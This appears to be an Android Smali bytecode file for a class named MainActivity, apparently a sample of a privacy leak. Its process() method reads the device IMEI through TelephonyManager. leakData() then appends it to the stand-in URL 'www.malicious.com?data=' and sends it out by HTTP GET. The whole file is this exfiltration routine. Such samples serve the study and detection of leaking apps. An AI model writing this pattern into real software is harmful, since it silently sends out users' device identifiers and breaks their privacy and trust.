.class public Lcom/example/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# instance fields
.field private phone:Ljava/lang/String;

.field private url:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    const-string v0, "www.malicious.com?data="
    iput-object v0, p0, Lcom/example/MainActivity;->url:Ljava/lang/String;
    const-string v0, "phone"
    iput-object v0, p0, Lcom/example/MainActivity;->phone:Ljava/lang/String;
    return-void
.end method


# virtual methods
.method public leakData(Ljava/lang/String;)V
    .locals 4
    .param p1, "data"    # Ljava/lang/String;
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    .local v0, "sb":Ljava/lang/StringBuilder;
    iget-object v1, p0, Lcom/example/MainActivity;->url:Ljava/lang/String;
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;
    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V
    .local v1, "httpClient":Lorg/apache/http/impl/client/DefaultHttpClient;
    new-instance v2, Lorg/apache/http/client/methods/HttpGet;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v3
    invoke-direct {v2, v3}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V
    .local v2, "httpGet":Lorg/apache/http/client/methods/HttpGet;
    invoke-virtual {v1, v2}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;
    move-result-object v3
    .local v3, "response":Lorg/apache/http/HttpResponse;
    return-void
.end method

.method public process()V
    .locals 2
    iget-object v0, p0, Lcom/example/MainActivity;->phone:Ljava/lang/String;
    invoke-virtual {p0, v0}, Lcom/example/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v0
    check-cast v0, Landroid/telephony/TelephonyManager;
    .local v0, "manager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getImei()Ljava/lang/String;
    move-result-object v1
    .local v1, "imei":Ljava/lang/String;
    invoke-virtual {p0, v1}, Lcom/example/MainActivity;->leakData(Ljava/lang/String;)V
    return-void
.end method
